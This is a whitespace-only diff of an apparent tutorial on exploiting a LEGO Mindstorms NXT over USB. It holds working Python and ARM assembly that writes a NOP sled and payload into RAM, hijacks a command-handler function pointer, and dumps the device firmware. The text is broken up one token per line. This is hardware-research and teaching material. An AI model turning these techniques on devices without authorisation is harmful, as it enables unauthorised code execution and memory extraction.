@@ -117,17 +117,17 @@ Setting up Python, creating avirtualenv, installing PyUSB, installing USB driver
 First we need to open a connection to the NXT:
 
 >>>
- 
+
 import
- 
+
 usb.core
 
 >>>
- 
+
 dev
- 
+
 =
- 
+
 usb
 .
 core
@@ -138,14 +138,14 @@ idVendor
 =
 0x0694
 ,
- 
+
 idProduct
 =
 0x0002
 )
 
 >>>
- 
+
 dev
 .
 set_configuration
@@ -154,14 +154,14 @@ set_configuration
 Then we need to see if we can indeed access the VM (or "command") module's IO-Map:
 
 >>>
- 
+
 dev
 .
 write
 (
 1
 ,
- 
+
 b
 '
 \x01\x94\x01\x00\x01\x00\x00\x00\x10\x00
@@ -171,7 +171,7 @@ b
 10
 
 >>>
- 
+
 bytes
 (
 dev
@@ -180,7 +180,7 @@ read
 (
 0x82
 ,
- 
+
 64
 ))
 
@@ -232,14 +232,14 @@ Finally, we have the data which was read:MindstormsNXT\x00\x00\x00. This data co
 Let's try reading that function pointer now:
 
 >>>
- 
+
 dev
 .
 write
 (
 1
 ,
- 
+
 b
 '
 \x01\x94\x01\x00\x01\x00\x10\x00\x04\x00
@@ -249,14 +249,14 @@ b
 10
 
 >>>
- 
+
 dev
 .
 read
 (
 0x82
 ,
- 
+
 64
 )
 
@@ -264,67 +264,67 @@ array
 (
 'B'
 ,
- 
+
 [
 2
 ,
- 
+
 148
 ,
- 
+
 0
 ,
- 
+
 1
 ,
- 
+
 0
 ,
- 
+
 1
 ,
- 
+
 0
 ,
- 
+
 4
 ,
- 
+
 0
 ,
- 
+
 61
 ,
- 
+
 13
 ,
- 
+
 16
 ,
- 
+
 0
 ])
 
 >>>
- 
+
 hex
 (
 16
- 
+
 <<
- 
+
 16
- 
+
 |
- 
+
 13
- 
+
 <<
- 
+
 8
- 
+
 |
- 
+
 61
 )
 
@@ -335,14 +335,14 @@ It helps to see the difference if we line up the two commands:
 # First test
 
 >>>
- 
+
 dev
 .
 write
 (
 1
 ,
- 
+
 b
 '
 \x01\x94\x01\x00\x01\x00\x00\x00\x10\x00
@@ -352,14 +352,14 @@ b
 # Second test
 
 >>>
- 
+
 dev
 .
 write
 (
 1
 ,
- 
+
 b
 '
 \x01\x94\x01\x00\x01\x00\x10\x00\x04\x00
@@ -405,73 +405,73 @@ If we cause the CPU to jump to this address, the CPU will keep executing thenops
 In order to test this out, we need to build a bunch of scaffolding:
 
 import
- 
+
 struct
 
 import
- 
+
 subprocess
 
 import
- 
+
 usb.core
 
 def
- 
+
 iomap_rbytes
 (
 mod
 ,
- 
+
 off
 ,
- 
+
 len_
 ):
 
- 
+
 cmd
- 
+
 =
- 
+
 struct
 .
 pack
 (
 "<BBIHH"
 ,
- 
+
 1
 ,
- 
+
 0x94
 ,
- 
+
 mod
 ,
- 
+
 off
 ,
- 
+
 len_
 )
 
- 
+
 dev
 .
 write
 (
 1
 ,
- 
+
 cmd
 )
 
- 
+
 result
- 
+
 =
- 
+
 bytes
 (
 dev
@@ -480,113 +480,113 @@ read
 (
 0x82
 ,
- 
+
 64
 ))
 
- 
+
 # print(result)
 
- 
+
 assert
- 
+
 result
 [:
 9
 ]
- 
+
 ==
- 
+
 struct
 .
 pack
 (
 "<BBBIH"
 ,
- 
+
 2
 ,
- 
+
 0x94
 ,
- 
+
 0
 ,
- 
+
 mod
 ,
- 
+
 len_
 )
 
- 
+
 result_val
- 
+
 =
- 
+
 result
 [
 9
 :]
 
- 
+
 return
- 
+
 result_val
 
 def
- 
+
 iomap_r32
 (
 mod
 ,
- 
+
 off
 ):
 
- 
+
 cmd
- 
+
 =
- 
+
 struct
 .
 pack
 (
 "<BBIHH"
 ,
- 
+
 1
 ,
- 
+
 0x94
 ,
- 
+
 mod
 ,
- 
+
 off
 ,
- 
+
 4
 )
 
- 
+
 dev
 .
 write
 (
 1
 ,
- 
+
 cmd
 )
 
- 
+
 result
- 
+
 =
- 
+
 bytes
 (
 dev
@@ -595,57 +595,57 @@ read
 (
 0x82
 ,
- 
+
 64
 ))
 
- 
+
 # print(result)
 
- 
+
 assert
- 
+
 result
 [:
 9
 ]
- 
+
 ==
- 
+
 struct
 .
 pack
 (
 "<BBBIH"
 ,
- 
+
 2
 ,
- 
+
 0x94
 ,
- 
+
 0
 ,
- 
+
 mod
 ,
- 
+
 4
 )
 
- 
+
 result_val
- 
+
 =
- 
+
 struct
 .
 unpack
 (
 "<I"
 ,
- 
+
 result
 [
 9
@@ -653,70 +653,70 @@ result
 0
 ]
 
- 
+
 return
- 
+
 result_val
 
 def
- 
+
 iomap_w32
 (
 mod
 ,
- 
+
 off
 ,
- 
+
 val
 ):
 
- 
+
 cmd
- 
+
 =
- 
+
 struct
 .
 pack
 (
 "<BBIHHI"
 ,
- 
+
 1
 ,
- 
+
 0x95
 ,
- 
+
 mod
 ,
- 
+
 off
 ,
- 
+
 4
 ,
- 
+
 val
 )
 
- 
+
 dev
 .
 write
 (
 1
 ,
- 
+
 cmd
 )
 
- 
+
 result
- 
+
 =
- 
+
 bytes
 (
 dev
@@ -725,73 +725,73 @@ read
 (
 0x82
 ,
- 
+
 64
 ))
 
- 
+
 # print(result)
 
- 
+
 assert
- 
+
 result
- 
+
 ==
- 
+
 struct
 .
 pack
 (
 "<BBBIH"
 ,
- 
+
 2
 ,
- 
+
 0x95
 ,
- 
+
 0
 ,
- 
+
 mod
 ,
- 
+
 4
 )
 
 def
- 
+
 testbeep
 ():
 
- 
+
 cmd
- 
+
 =
- 
+
 b
 '
 \x00\x03\xff\x00\xff\x00
 '
 
- 
+
 dev
 .
 write
 (
 1
 ,
- 
+
 cmd
 )
 
- 
+
 result
- 
+
 =
- 
+
 bytes
 (
 dev
@@ -800,32 +800,32 @@ read
 (
 0x82
 ,
- 
+
 64
 ))
 
- 
+
 print
 (
 result
 )
 
 CMD_MODULE
- 
+
 =
- 
+
 0x00010001
 
 CMD_OFF_FNPTR
- 
+
 =
- 
+
 16
 
 CMD_OFF_MEMPOOL
- 
+
 =
- 
+
 52
 
 subprocess
@@ -834,13 +834,13 @@ run
 ([
 'arm-none-eabi-gcc'
 ,
- 
+
 '-c'
 ,
- 
+
 'nxtpwn.s'
 ],
- 
+
 check
 =
 True
@@ -852,44 +852,44 @@ run
 ([
 'arm-none-eabi-objcopy'
 ,
- 
+
 '-O'
 ,
- 
+
 'binary'
 ,
- 
+
 'nxtpwn.o'
 ,
- 
+
 'nxtpwn.bin'
 ],
- 
+
 check
 =
 True
 )
 
 with
- 
+
 open
 (
 'nxtpwn.bin'
 ,
- 
+
 'rb'
 )
- 
+
 as
- 
+
 f
 :
 
- 
+
 nxtpwn_code
- 
+
 =
- 
+
 f
 .
 read
@@ -899,50 +899,50 @@ print
 (
 "code"
 ,
- 
+
 nxtpwn_code
 )
 
 assert
- 
+
 len
 (
 nxtpwn_code
 )
- 
+
 %
- 
+
 4
- 
+
 ==
- 
+
 0
 
 ARM_NOP
- 
+
 =
- 
+
 0xe1a00000
 
 nop_len
- 
+
 =
- 
+
 32
 *
 1024
- 
+
 -
- 
+
 len
 (
 nxtpwn_code
 )
 
 dev
- 
+
 =
- 
+
 usb
 .
 core
@@ -953,7 +953,7 @@ idVendor
 =
 0x0694
 ,
- 
+
 idProduct
 =
 0x0002
@@ -970,81 +970,81 @@ print
 )
 
 for
- 
+
 i
- 
+
 in
- 
+
 range
 (
 nop_len
- 
+
 //
- 
+
 4
 ):
 
- 
+
 iomap_w32
 (
 CMD_MODULE
 ,
- 
+
 CMD_OFF_MEMPOOL
- 
+
 +
- 
+
 i
 *
 4
 ,
- 
+
 ARM_NOP
 )
 
 for
- 
+
 i
- 
+
 in
- 
+
 range
 (
 len
 (
 nxtpwn_code
 )
- 
+
 //
- 
+
 4
 ):
 
- 
+
 offs
- 
+
 =
- 
+
 nop_len
- 
+
 +
- 
+
 i
 *
 4
 
- 
+
 val
- 
+
 =
- 
+
 struct
 .
 unpack
 (
 "<I"
 ,
- 
+
 nxtpwn_code
 [
 i
@@ -1060,19 +1060,19 @@ i
 0
 ]
 
- 
+
 iomap_w32
 (
 CMD_MODULE
 ,
- 
+
 CMD_OFF_MEMPOOL
- 
+
 +
- 
+
 offs
 ,
- 
+
 val
 )
 
@@ -1083,7 +1083,7 @@ You will need to somehow install a copy of GCC and Binutils targeting ARM. Any r
 To test this, we can write the most basic assembly code innxtpwn.s:
 
 bx
- 
+
 lr
 
 This is an empty function which doesn't do anything. If we redirect the direct command handler to it, all direct commands should stop working.
@@ -1101,7 +1101,7 @@ We can usepython3 -i nxtpwn.pyto load the exploit code before dropping us into t
 Before we actually trigger the exploit, let's try running a "direct" command to make sure it works:
 
 >>>
- 
+
 testbeep
 ()
 
@@ -1115,19 +1115,19 @@ This should make the NXT beep.
 To trigger the exploit, we can enter the following:
 
 >>>
- 
+
 iomap_w32
 (
 CMD_MODULE
 ,
- 
+
 CMD_OFF_FNPTR
 ,
- 
+
 0x00200000
- 
+
 +
- 
+
 32
 *
 1024
@@ -1136,7 +1136,7 @@ CMD_OFF_FNPTR
 This replaces thatpRCHandlerfunction pointer with an address in RAM as described above. Now let's try to make the NXT beep again:
 
 >>>
- 
+
 testbeep
 ()
 
@@ -1170,7 +1170,7 @@ We can replace the direct command handler with a function that reads from an arb
 # save r4
 
 push
- 
+
 {
 r4
 }
@@ -1178,121 +1178,121 @@ r4
 # skip 2 bytes of packet
 
 add
- 
+
 r0
 ,
- 
+
 #2
 
 # load 4 bytes of the address
 
 ldrb
- 
+
 r3
 ,
- 
+
 [
 r0
 ]
 
 add
- 
+
 r0
 ,
- 
+
 #1
 
 ldrb
- 
+
 r4
 ,
- 
+
 [
 r0
 ]
 
 add
- 
+
 r0
 ,
- 
+
 #1
 
 orr
- 
+
 r3
 ,
- 
+
 r4
 ,
- 
+
 lsl
- 
+
 #8
 
 ldrb
- 
+
 r4
 ,
- 
+
 [
 r0
 ]
 
 add
- 
+
 r0
 ,
- 
+
 #1
 
 orr
- 
+
 r3
 ,
- 
+
 r4
 ,
- 
+
 lsl
- 
+
 #16
 
 ldrb
- 
+
 r4
 ,
- 
+
 [
 r0
 ]
 
 add
- 
+
 r0
 ,
- 
+
 #1
 
 orr
- 
+
 r3
 ,
- 
+
 r4
 ,
- 
+
 lsl
- 
+
 #24
 
 # read data from that address
 
 ldr
- 
+
 r3
 ,
- 
+
 [
 r3
 ]
@@ -1300,79 +1300,79 @@ r3
 # store 4 bytes of the resulting value
 
 strb
- 
+
 r3
 ,
- 
+
 [
 r1
 ]
 
 add
- 
+
 r1
 ,
- 
+
 #1
 
 lsr
- 
+
 r3
 ,
- 
+
 #8
 
 strb
- 
+
 r3
 ,
- 
+
 [
 r1
 ]
 
 add
- 
+
 r1
 ,
- 
+
 #1
 
 lsr
- 
+
 r3
 ,
- 
+
 #8
 
 strb
- 
+
 r3
 ,
- 
+
 [
 r1
 ]
 
 add
- 
+
 r1
 ,
- 
+
 #1
 
 lsr
- 
+
 r3
 ,
- 
+
 #8
 
 strb
- 
+
 r3
 ,
- 
+
 [
 r1
 ]
@@ -1380,17 +1380,17 @@ r1
 # store the output length of 4
 
 mov
- 
+
 r3
 ,
- 
+
 #4
 
 strb
- 
+
 r3
 ,
- 
+
 [
 r2
 ]
@@ -1398,20 +1398,20 @@ r2
 # return success
 
 mov
- 
+
 r0
 ,
- 
+
 #0
 
 pop
- 
+
 {
 r4
 }
 
 bx
- 
+
 lr
 
 Why do we need to saver4?
@@ -1429,63 +1429,63 @@ iomap_w32
 (
 CMD_MODULE
 ,
- 
+
 CMD_OFF_FNPTR
 ,
- 
+
 0x00200000
- 
+
 +
- 
+
 32
 *
 1024
 )
 
 def
- 
+
 pwn_read
 (
 addr
 ):
 
- 
+
 cmd
- 
+
 =
- 
+
 struct
 .
 pack
 (
 "<BBI"
 ,
- 
+
 0
 ,
- 
+
 0xaa
 ,
- 
+
 addr
 )
 
- 
+
 dev
 .
 write
 (
 1
 ,
- 
+
 cmd
 )
 
- 
+
 result
- 
+
 =
- 
+
 bytes
 (
 dev
@@ -1494,48 +1494,48 @@ read
 (
 0x82
 ,
- 
+
 64
 ))
 
- 
+
 # print(result)
 
- 
+
 assert
- 
+
 result
 [:
 2
 ]
- 
+
 ==
- 
+
 struct
 .
 pack
 (
 "<BB"
 ,
- 
+
 2
 ,
- 
+
 0xaa
 )
 
- 
+
 result_val
- 
+
 =
- 
+
 struct
 .
 unpack
 (
 "<I"
 ,
- 
+
 result
 [
 2
@@ -1543,15 +1543,15 @@ result
 0
 ]
 
- 
+
 return
- 
+
 result_val
 
 This code sends a "direct" command with a dummy command byte of 0xaa (the firmware assumes this exists) followed by an address we want to read. The result contains the dummy command followed by 4 bytes of data. We can now try it out:
 
 >>>
- 
+
 hex
 (
 pwn_read
@@ -1562,7 +1562,7 @@ pwn_read
 '0xeafffffe'
 
 >>>
- 
+
 hex
 (
 pwn_read
@@ -1573,7 +1573,7 @@ pwn_read
 '0xeafffffe'
 
 >>>
- 
+
 hex
 (
 pwn_read
@@ -1584,7 +1584,7 @@ pwn_read
 '0xeafffffe'
 
 >>>
- 
+
 hex
 (
 pwn_read
@@ -1595,7 +1595,7 @@ pwn_read
 '0xeafffffe'
 
 >>>
- 
+
 hex
 (
 pwn_read
@@ -1606,7 +1606,7 @@ pwn_read
 '0xeafffffe'
 
 >>>
- 
+
 hex
 (
 pwn_read
@@ -1617,7 +1617,7 @@ pwn_read
 '0xeafffffe'
 
 >>>
- 
+
 hex
 (
 pwn_read
@@ -1628,7 +1628,7 @@ pwn_read
 '0xea000009'
 
 >>>
- 
+
 hex
 (
 pwn_read
@@ -1639,7 +1639,7 @@ pwn_read
 '0xe1a09000'
 
 >>>
- 
+
 hex
 (
 pwn_read
@@ -1663,66 +1663,66 @@ print
 )
 
 with
- 
+
 open
 (
 'nxtpwn-dump.bin'
 ,
- 
+
 'wb'
 )
- 
+
 as
- 
+
 f
 :
 
- 
+
 for
- 
+
 i
- 
+
 in
- 
+
 range
 (
 256
- 
+
 *
- 
+
 1024
- 
+
 //
- 
+
 4
 ):
 
- 
+
 addr
- 
+
 =
- 
+
 0x00100000
- 
+
 +
- 
+
 i
- 
+
 *
- 
+
 4
 
- 
+
 val
- 
+
 =
- 
+
 pwn_read
 (
 addr
 )
 
- 
+
 f
 .
 write
@@ -1733,46 +1733,46 @@ pack
 (
 "<I"
 ,
- 
+
 val
 ))
 
- 
+
 if
- 
+
 i
- 
+
 %
- 
+
 1024
- 
+
 ==
- 
+
 0
 :
 
- 
+
 print
 (
 f
 "
 \t
-Done with 
+Done with
 {
 (
 i
- 
+
 //
- 
+
 1024
- 
+
 +
- 
+
 1
 )
- 
+
 *
- 
+
 4
 }
 /256 KiB"
@@ -1781,57 +1781,57 @@ i
 And with that, we have the firmware:
 
 $
- 
+
 xxd
- 
+
 nxtpwn-dump.bin
- 
+
 |
- 
+
 less
 …
 00019cd0:
- 
+
 3032
- 
+
 5800
- 
+
 4d61
- 
+
 7220
- 
+
 2033
- 
+
 2032
- 
+
 3030
- 
+
 3600
- 
+
 02X.Mar
- 
+
 3
- 
+
 2006
 .
 00019ce0:
- 
+
 3138
- 
+
 3a32
- 
+
 313a
- 
+
 3033
- 
+
 004a
- 
+
 616e
- 
+
 4665
- 
+
 624d
- 
+
 18
 :21:03.JanFebM
 …
